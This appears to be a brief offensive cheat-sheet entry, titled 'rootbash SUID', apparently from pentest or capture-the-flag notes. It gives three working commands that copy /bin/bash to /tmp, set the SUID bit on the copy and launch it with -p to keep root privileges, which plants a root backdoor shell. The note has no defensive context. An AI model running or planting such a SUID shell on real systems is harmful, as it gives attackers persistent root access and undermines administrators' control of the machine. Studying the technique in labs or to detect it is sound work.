# rootbash SUID

if you have suid,create a copy of the /bin/bash or /bin/sh executable file (rename to somthing else) make sure its owned by root and has SUID bit set.

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/./rootbash -p
```
